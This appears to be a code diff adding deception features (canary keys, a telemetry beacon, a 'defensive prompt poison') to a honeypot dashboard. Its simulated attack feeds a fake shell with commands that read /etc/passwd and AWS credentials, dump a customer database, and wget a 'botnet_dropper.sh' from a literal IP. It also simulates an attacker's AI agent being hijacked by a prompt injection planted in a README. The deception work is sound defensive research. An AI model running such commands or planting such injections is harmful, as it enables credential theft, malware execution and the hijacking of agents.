@@ -14,6 +14,10 @@ from cloud_honeypot_ai.config import CONFIG
 from cloud_honeypot_ai.core.session import GLOBAL_SESSION_MANAGER, SessionManager
 from cloud_honeypot_ai.crypto.posture_auditor import CRYPTO_AUDITOR
 from cloud_honeypot_ai.crypto.vault import CRYPTO_VAULT
+from cloud_honeypot_ai.deception.canary_api_tracker import CANARY_GPS_TRACKER
+from cloud_honeypot_ai.deception.defensive_prompt_poison import DEFENSIVE_POISONER
+from cloud_honeypot_ai.deception.honey_database import HONEY_DB_GENERATOR
+from cloud_honeypot_ai.deception.telemetry_beacon import TELEMETRY_BEACON_MGR
 
 logger = logging.getLogger("honeypot.web")
 
@@ -85,13 +89,23 @@ class DashboardHandler(BaseHTTPRequestHandler):
                     "crypto_audit": audit.to_dict(),
                 }
             )
+        elif path == "/api/deception":
+            self._serve_json(
+                {
+                    "canary_emails_count": len(HONEY_DB_GENERATOR.active_canary_emails),
+                    "gps_keys_count": len(HONEY_DB_GENERATOR.active_gps_keys),
+                    "gps_triggers": [t.to_dict() for t in CANARY_GPS_TRACKER.all_triggers()],
+                    "beacon_alerts": [b.to_dict() for b in TELEMETRY_BEACON_MGR.all_alerts()],
+                    "ai_poison_events": DEFENSIVE_POISONER.all_ai_triggers(),
+                }
+            )
         else:
             self.send_error(404, "Not Found")
 
     def do_POST(self) -> None:
         path = self.path.split("?")[0]
         if path == "/api/simulate":
-            # Simulate a realistic hacker attack sequence for demonstration
+            # Simulate a realistic hacker attack sequence with Active Deception & Watermarking
             from cloud_honeypot_ai.core.fake_shell import FakeShell
             import random
 
@@ -110,12 +124,62 @@ class DashboardHandler(BaseHTTPRequestHandler):
                 "id",
                 "cat /etc/passwd",
                 "cat ~/.aws/credentials",
+                "cat /docs/README_arquitetura.md",  # PROMPT INJECTION DEFENSIVE TRAP
+                "pg_dump -h prod-db customers > /var/backups/customers_dump.sql", # 5 LIVING CELLS DUMP
+                "cat /var/backups/customers_dump.sql",
+                "python3 /opt/cloud_engine/test_engine.py", # TELEMETRY BEACON TRIGGER
                 "wget http://194.26.29.10/botnet_dropper.sh",
                 "chmod +x botnet_dropper.sh",
             ]
             for cmd in cmds:
                 res = shell.execute(cmd)
                 session.record_command(cmd, res.stdout, res.canary_triggered)
+
+            # Simulate attacker running validation script on their home IP (VPN bypassed)
+            home_ip_attacker = "177.54.144.92"  # Public broadband IP in São Paulo, Brazil
+            canary_key = f"sk_live_picoas_gps_{session.session_id[:8]}_vip"
+            gps_alert = CANARY_GPS_TRACKER.record_trigger(
+                api_key=canary_key,
+                client_ip=home_ip_attacker,
+                user_agent="python-requests/2.31.0",
+                headers={"Host": "api.picoas-cloud.internal", "Authorization": f"Bearer {canary_key}"},
+            )
+            session.record_command(
+                f"GPS_KEY_TRIGGERED: {canary_key}",
+                f"De-anonymized real attacker machine! IP: {home_ip_attacker} ({gps_alert.city}, {gps_alert.country})",
+                canary_tag="GPS_CANARY_API_KEY_DEANONYMIZED",
+            )
+
+            # Simulate telemetry beacon callback from attacker local machine
+            beacon_alert = TELEMETRY_BEACON_MGR.record_beacon_heartbeat(
+                client_ip=home_ip_attacker,
+                telemetry_dict={
+                    "beacon_id": f"beacon_pkg_{session.session_id[:8]}",
+                    "source_session": session.session_id,
+                    "hostname": "kali-infiltrator-desktop",
+                    "os": "Linux 6.1.0-kali9-amd64",
+                    "local_user": "shadow_operator",
+                    "machine": "x86_64",
+                    "python_version": "3.11.2",
+                },
+            )
+            session.record_command(
+                f"TELEMETRY_BEACON_HEARTBEAT: {beacon_alert.beacon_id}",
+                f"Attacker machine unmasked: Host '{beacon_alert.target_hostname}', User '{beacon_alert.target_local_username}', OS '{beacon_alert.target_os}'",
+                canary_tag="TELEMETRY_BEACON_DEANONYMIZED_ATTACKER",
+            )
+
+            # Simulate attacker's AI Agent falling into defensive prompt poison
+            DEFENSIVE_POISONER.record_ai_trigger(
+                query_params={"session": session.session_id, "agent_compromised": "true"},
+                client_ip=chosen_ip,
+                user_agent="AutoGPT-Agent/4.0-Scraper",
+            )
+            session.record_command(
+                "ATTACKER_AI_POISON_TRIGGER: /api/v1/ai-poison/trigger",
+                "Attacker AutoGPT Agent Neutralized by Defensive Prompt Injection!",
+                canary_tag="DEFENSIVE_PROMPT_INJECTION_TRIGGERED",
+            )
 
             session.close()
             self.session_mgr.save_session_to_disk(session)
@@ -124,9 +188,16 @@ class DashboardHandler(BaseHTTPRequestHandler):
             report = THREAT_ANALYZER.analyze_session(session)
             CRYPTO_VAULT.seal_session(session.to_dict())
             CLOUD_DEFENSE.add_malicious_ip(chosen_ip)
+            CLOUD_DEFENSE.add_malicious_ip(home_ip_attacker)
             CLOUD_DEFENSE.generate_defense_rules()
 
-            self._serve_json({"status": "success", "session": session.to_dict(), "threat_report": report.to_dict()})
+            self._serve_json({
+                "status": "success",
+                "session": session.to_dict(),
+                "threat_report": report.to_dict(),
+                "gps_deanonymization": gps_alert.to_dict(),
+                "telemetry_beacon": beacon_alert.to_dict(),
+            })
         else:
             self.send_error(404, "Not Found")
 
